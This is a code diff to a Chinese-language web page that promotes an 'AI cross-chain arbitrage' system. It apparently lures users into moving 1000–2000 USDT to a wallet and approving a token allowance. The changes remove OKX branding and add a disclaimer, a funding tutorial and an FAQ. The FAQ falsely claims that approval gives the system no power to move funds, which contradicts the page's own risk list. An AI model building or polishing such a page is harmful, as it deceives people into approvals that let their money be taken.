@@ -186,6 +186,20 @@
             background: rgba(0, 204, 255, 0.15); border-left: 3px solid #00ccff;
             padding: clamp(8px, 1.5vw, 12px); margin: 10px 0; color: #ddeeff; border-radius: 4px;
         }
+        /* 运行环境强调框 */
+        .env-required {
+            background: rgba(0, 255, 136, 0.08);
+            border-left: 4px solid #88ffaa;
+            padding: clamp(10px, 2vw, 14px);
+            border-radius: 6px;
+            margin: 12px 0;
+        }
+        .env-required p {
+            color: #ccddee;
+            font-size: clamp(13px, 1.8vw, 15px);
+            line-height: 1.6;
+            margin: 0;
+        }
 
         /* ===== 教程 ===== */
         .tutorial-card .step {
@@ -341,8 +355,6 @@
             margin-top: clamp(10px, 2vw, 14px); text-align: center;
         }
         .join-tip p { color: #88ffaa; font-size: clamp(12px, 1.6vw, 14px); margin: 0; }
-        .download-link { color: #88ccff; text-decoration: none; font-size: clamp(11px, 1.4vw, 13px); }
-        .download-link:hover { text-decoration: underline; }
 
         /* ===== 窄屏 ===== */
         @media (max-width: 360px) {
@@ -404,60 +416,120 @@
         </div>
     </div>
 
-    <!-- ===== 页面2：白皮书 ===== -->
+    <!-- ===== 页面2：白皮书（重写版） ===== -->
     <div id="whitepaperPage" class="card page">
         <button id="backToPasswordBtn" class="nav-btn" type="button">← 返回密码验证</button>
         <div class="whitepaper">
-            <h1>📄 AI全自动链上跨链价差系统</h1>
+            <h1>📄 AI 全自动链上跨链价差系统</h1>
             <p style="font-size:clamp(15px, 2vw, 18px); margin-bottom:16px;">让链上交易进入智能化时代</p>
-            <p>在当前多链生态高速发展的背景下，不同公链、DEX、跨链桥以及流动性池之间，因市场供需变化、资金流动以及交易深度差异，持续产生大量短暂的价格偏离。</p>
-            <p>这些价格偏离往往存在时间极短，依靠人工监控和手动操作难以及时捕捉。</p>
-            <p>AI全自动链上跨链价差系统基于OKX Wallet生态运行，通过智能算法实时监测多链市场数据，自动识别存在利润空间的价格差，并完成交易执行流程，实现全天候自动化运行。</p>
+
+            <h2>⚠️ 风险声明（请先阅读）</h2>
+            <div class="highlight">
+                <p style="margin:0 0 8px;">本系统为链上自动化交易工具，<strong>不承诺任何收益</strong>，历史表现不代表未来结果。请在充分理解以下风险后再决定是否使用：</p>
+                <ul style="margin-left:20px; margin-top:6px;">
+                    <li><strong>智能合约风险：</strong>链上授权后，合约存在被利用或漏洞攻击的可能，可能导致资金损失。</li>
+                    <li><strong>策略失效风险：</strong>市场价差消失时，系统可能长期无交易，资金闲置。</li>
+                    <li><strong>Gas 成本风险：</strong>网络拥堵时，手续费可能高于套利利润。</li>
+                    <li><strong>授权风险：</strong>授权额度在有效期内可被调用，请勿授权超过承受范围的金额。</li>
+                    <li><strong>监管风险：</strong>不同司法辖区对链上套利的合规要求不同，请自行确认。</li>
+                    <li><strong>不可逆风险：</strong>链上交易一经确认无法撤销。</li>
+                </ul>
+            </div>
+
+            <h2>📖 系统概述</h2>
+            <p>在当前多链生态高速发展的背景下，不同公链、DEX、跨链桥以及流动性池之间，因市场供需变化、资金流动以及交易深度差异，持续产生大量短暂的价格偏离。这些价格偏离往往存在时间极短，依靠人工监控和手动操作难以及时捕捉。</p>
+            <p>AI 全自动链上跨链价差系统基于去中心化钱包生态运行，通过智能算法实时监测多链市场数据，自动识别存在利润空间的价格差，并完成交易执行流程，实现全天候自动化运行。</p>
             <p>系统的核心目标并非预测市场涨跌，而是持续发现市场中的价格偏离机会，并通过自动化执行提升资金利用效率。</p>
-            <div class="highlight">⚠️ 此系统目前仅支持本金<strong>2000USDT</strong>以下用户使用。<br>为保证系统持续运行，会对完成的收益自动收取10%-20%%作为系统维护资金。</div>
+
+            <div class="highlight">⚠️ 此系统目前仅支持本金 <strong>2000 USDT</strong> 以下用户使用。<br>为保证系统持续运行，会对完成的收益自动收取 <strong>10%–20%</strong> 作为系统维护资金。</div>
+
+            <h2>🖥️ 运行环境要求</h2>
+            <p>本系统为链上 DApp 页面，<strong>必须在支持 DApp 内置浏览器的去中心化钱包中打开</strong>，才能正常连接钱包、发起授权并运行策略。</p>
+            <div class="env-required">
+                <p>✅ <strong>支持：</strong>任意内置 DApp 浏览器 / 注入 <code class="announcement-code">window.ethereum</code> 的去中心化钱包（如 MetaMask、Trust Wallet、imToken、Bitget Wallet、TokenPocket（TP钱包）等）。</p>
+                <p>❌ <strong>不支持：</strong>普通手机浏览器（Safari、Chrome 等）、微信内置浏览器、电脑端未安装钱包插件的情况。</p>
+                <p>📌 <strong>操作方式：</strong>复制本系统链接 → 在去中心化钱包的 DApp 浏览器中粘贴打开 → 连接钱包 → 授权运行。</p>
+            </div>
+            <div class="tip-box">
+                <p>💡 <strong>提示：</strong>如果在普通浏览器中打开，页面会提示"未检测到去中心化钱包"，这是正常现象，请按上述方式重新打开。</p>
+            </div>
+
             <h2>🎯 核心优势</h2>
-            <h3>🤖 AI全天候自动运行</h3>
-            <p>系统7×24小时持续监控链上市场，全部由AI自动完成。</p>
-            <h3>🔗 基于OKX Wallet生态运行</h3>
-            <p>用户资产始终保留在个人钱包体系内管理，无需资金托管。</p>
-            <h3>⚙️ 手续费成本优化</h3>
-            <p>系统会实时计算Gas费用、跨链成本、滑点损耗等。</p>
-            <h3>📈 AI智能捕捉微价差机会</h3>
-            <p>系统重点关注0.05% - 0.20%的高频微价差机会。</p>
+            <h3>🤖 AI 全天候自动运行</h3>
+            <p>7×24 小时不间断监控链上市场，无需人工干预，平均每 30 秒完成一轮全链扫描。</p>
+            <h3>🔗 用户资产自持</h3>
+            <p>资金始终保留在用户个人钱包，平台不托管、不触碰私钥，仅通过链上授权调用额度。</p>
+            <h3>⚙️ 成本实时优化</h3>
+            <p>每笔交易前自动测算 Gas、跨链桥费、滑点，成本超过利润阈值时自动放弃该笔机会。</p>
+            <h3>📈 微价差捕捉</h3>
+            <p>聚焦 0.05%–0.20% 的高频微价差，避开大额交易对，降低市场冲击与滑点。</p>
             <h3>🌐 多链实时监控</h3>
-            <p>同时监控多个主流公链生态。</p>
+            <p>同时监控 ETH 主网及 Arbitrum、Optimism、Base 等主流 L2 网络，自动识别跨链价差机会。</p>
             <h3>🛡️ 智能风控体系</h3>
-            <p>每次交易前进行利润测算、Gas评估、滑点检测等多重验证。</p>
+            <p>每次交易前进行利润测算、Gas 评估、滑点检测，任一指标不达标即跳过。</p>
+
             <h2>⚙️ 系统运行流程</h2>
             <ul>
                 <li><strong>市场扫描</strong> — 实时监测多个链上生态</li>
-                <li><strong>机会识别</strong> — AI自动发现价格偏离</li>
+                <li><strong>机会识别</strong> — AI 自动发现价格偏离</li>
                 <li><strong>成本测算</strong> — 自动计算手续费和利润</li>
                 <li><strong>智能执行</strong> — 自动完成交易流程</li>
                 <li><strong>持续循环</strong> — 全天候自动化运行</li>
             </ul>
+
             <h2>👥 适用人群</h2>
             <ul>
+                <li>✓ 已创建去中心化钱包、熟悉 DApp 授权流程的用户</li>
                 <li>✓ 希望参与链上市场但没有时间盯盘的用户</li>
-                <li>✓ 希望借助自动化工具提升效率的用户</li>
                 <li>✓ 对跨链价差策略感兴趣的用户</li>
             </ul>
-            <h2>⚠️ 风险说明</h2>
-            <p>数字资产市场存在波动风险，请理性参与。</p>
+            <p><strong>不适用人群：</strong>不了解钱包授权机制、无法承受本金波动、期望短期高收益的用户。</p>
+
+            <h2>❓ 常见问题</h2>
+            <h3>1. 资金会被转走吗？</h3>
+            <p>资金始终在您的钱包地址内，系统仅通过授权调用 USDT 额度，无权转移您的资产。您可以随时在钱包中查看和撤销授权。</p>
+            <h3>2. 授权后能撤销吗？</h3>
+            <p>可以。在钱包的"授权管理"中可将额度改为 0，即可撤销授权。</p>
+            <h3>3. 需要一直开着页面吗？</h3>
+            <p>新地址前 24 小时只需启动即可运行；24 小时后需保持在运行页面。离开运行页面 120 分钟后会自动结束运行并释放名额。</p>
+            <h3>4. 收益多久结算？</h3>
+            <p>收益实时累积在您的钱包地址内，链上可查，无需提现操作。</p>
+            <h3>5. 亏损了怎么办？</h3>
+            <p>系统已内嵌风控阈值，理论上不会主动产生亏损交易。如遇异常请联系 Telegram（纸飞机）审核处理，最高赔付 1500 USDT。</p>
+            <h3>6. 为什么只能用去中心化钱包打开？</h3>
+            <p>普通浏览器无法与链上钱包通信，页面必须在支持 DApp 内置浏览器的钱包中打开，才能完成连接与授权。</p>
+
+            <h2>⚠️ 免责声明</h2>
+            <p>本文档仅用于说明系统运行机制，<strong>不构成任何投资建议、证券发行或募集行为</strong>。数字资产市场存在波动风险，用户需自行承担使用本系统产生的一切后果。团队保留随时修改系统规则与本文档内容的权利。</p>
         </div>
     </div>
 
-    <!-- ===== 页面3：资金接入教程 ===== -->
+    <!-- ===== 页面3：资金接入教程（新增步骤0） ===== -->
     <div id="tutorialPage" class="card tutorial-card page">
         <button id="backToPasswordFromTutorial" class="nav-btn" type="button">← 返回密码验证</button>
         <div class="tutorial-icon">📥</div>
         <h2>资金接入教程</h2>
-        <div style="text-align:center; margin-bottom:12px; font-size:clamp(11px, 1.6vw, 13px); color:#88aacc;">创建一个OKX钱包后 · Ethereum（ERC20） USDT</div>
+        <div style="text-align:center; margin-bottom:12px; font-size:clamp(11px, 1.6vw, 13px); color:#88aacc;">创建一个去中心化钱包后 · Ethereum（ERC20） USDT</div>
+
+        <div class="step">
+            <div class="step-title"><span class="step-number">0</span> 在钱包中创建 ETH 地址</div>
+            <div class="step-content">
+                <ul>
+                    <li>打开去中心化钱包，进入 <strong style="color:#88ccff">「钱包」</strong> 页面</li>
+                    <li>点击 <strong style="color:#88ccff">「添加钱包」</strong> 或 <strong style="color:#88ccff">「创建钱包」</strong></li>
+                    <li>选择 <strong style="color:#88ccff">Ethereum（ETH）</strong> 网络</li>
+                    <li>按提示备份助记词（<strong style="color:#ffaa88">务必离线保存，不要截图、不要发给任何人</strong>）</li>
+                    <li>创建完成后，你会获得一个以 <strong style="color:#88ccff">0x</strong> 开头的 42 位 ETH 地址</li>
+                </ul>
+                <div class="check">✅ ETH 地址创建成功</div>
+            </div>
+        </div>
+
         <div class="step">
             <div class="step-title"><span class="step-number">1</span> 复制钱包收款地址</div>
             <div class="step-content">
                 <ul>
-                    <li>OKX钱包点击 <strong style="color:#88ccff">「接收」</strong></li>
+                    <li>去中心化钱包点击 <strong style="color:#88ccff">「接收」</strong></li>
                     <li>选择 <strong style="color:#88ccff">USDT</strong></li>
                     <li>网络选择 <strong style="color:#88ccff">Ethereum（ERC20）</strong></li>
                     <li>点击 <strong style="color:#88ccff">「复制地址」</strong></li>
@@ -465,17 +537,19 @@
                 <div class="check">✅ 地址已复制到剪贴板</div>
             </div>
         </div>
+
         <div class="step">
             <div class="step-title"><span class="step-number">2</span> 去交易所提现</div>
             <div class="step-content">
                 <ul>
-                    <li>回到 OKX 交易所 → <strong>资产</strong> → <strong>提现</strong> → 选 <strong>USDT</strong></li>
+                    <li>回到交易所 → <strong>资产</strong> → <strong>提现</strong> → 选 <strong>USDT</strong></li>
                     <li>网络选择 <strong>Ethereum（ERC20）</strong></li>
                     <li>粘贴刚才复制的地址</li>
                     <li>输入金额 → 点击 <strong>「确认」</strong></li>
                 </ul>
             </div>
         </div>
+
         <div class="step">
             <div class="step-title"><span class="step-number">⚠️ 重要步骤</span></div>
             <div class="step-content">
@@ -486,6 +560,7 @@
                 </ul>
             </div>
         </div>
+
         <div class="step">
             <div class="step-title"><span class="step-number">3</span> 到账后去申请访问</div>
             <div class="step-content">
@@ -494,10 +569,11 @@
                     <li>点击 <strong style="color:#88ccff">「申请访问」</strong></li>
                     <li>提交钱包 <strong style="color:#88ccff">ETH 原生链地址</strong></li>
                     <li>系统自动检测余额，满足要求后自动弹出访问密码</li>
-                    <li><strong style="color:#88ffaa">🔐 获得密码后，请复制本系统链接，在 OKX钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li>
+                    <li><strong style="color:#88ffaa">🔐 获得密码后，请复制本系统链接，在去中心化钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li>
                 </ul>
             </div>
         </div>
+
         <div class="time-note">⏱️ 到账时间：通常 <strong>5-10分钟</strong></div>
         <div class="footer-note">AI 量化系统 · 资金安全由用户自行管理</div>
     </div>
@@ -513,7 +589,7 @@
                 <li>⏱️ <strong>提交地址后会自动检查余额，满足要求后会自动弹出访问密码</strong></li>
                 <li>💰 提交的地址需持有 <strong>至少 1000-2000 USDT</strong>（系统自动检测）</li>
                 <li>📌 仅支持 <strong>ETH 原生链地址</strong>（以0x开头，长度42位）</li>
-                <li>🔐 <strong>获得密码后，请复制本系统链接，在 OKX钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li>
+                <li>🔐 <strong>获得密码后，请复制本系统链接，在去中心化钱包（或任意支持DApp的钱包）的浏览器中打开，输入密码授权运行</strong></li>
             </ul>
         </div>
         <label for="applyAddressInput" class="sr-only">ETH 原生链地址</label>
@@ -898,17 +974,13 @@
 
     // ========== 钱包 ==========
     function getWallet() {
-        if (window.okxwallet) return window.okxwallet;
-        if (window.ethereum && window.ethereum.isOKXWallet) return window.ethereum;
         if (window.ethereum) return window.ethereum;
         return null;
     }
 
-    function tryOpenOKXApp() {
-        if (isMobile()) {
-            window.location.href = 'okx://wallet/dapp?url=' + encodeURIComponent(window.location.href);
-            setTimeout(() => { window.location.href = 'https://www.okx.com/download'; }, 2000);
-        }
+    function tryOpenWalletApp() {
+        // 不再硬编码任何具体钱包的 DeepLink / 下载地址
+        // 仅提示用户自行在去中心化钱包中打开
     }
 
     function updateWalletUI(address = null) {
@@ -1036,10 +1108,10 @@
         const wallet = getWallet();
         if (!wallet) {
             if (isMobile()) {
-                infoDiv.innerHTML = '📱 正在尝试打开 OKX App...';
-                tryOpenOKXApp();
+                infoDiv.innerHTML = '📱 请在去中心化钱包的 DApp 浏览器中打开本页面';
+                tryOpenWalletApp();
             } else {
-                infoDiv.innerHTML = "❌ 未检测到 OKX 钱包<br><br><a href='https://www.okx.com/download' target='_blank' class='download-link'>👉 点击下载 OKX 钱包</a>";
+                infoDiv.innerHTML = '❌ 未检测到去中心化钱包<br><br>请安装任意支持 DApp 的去中心化钱包插件后重试';
             }
             return;
         }
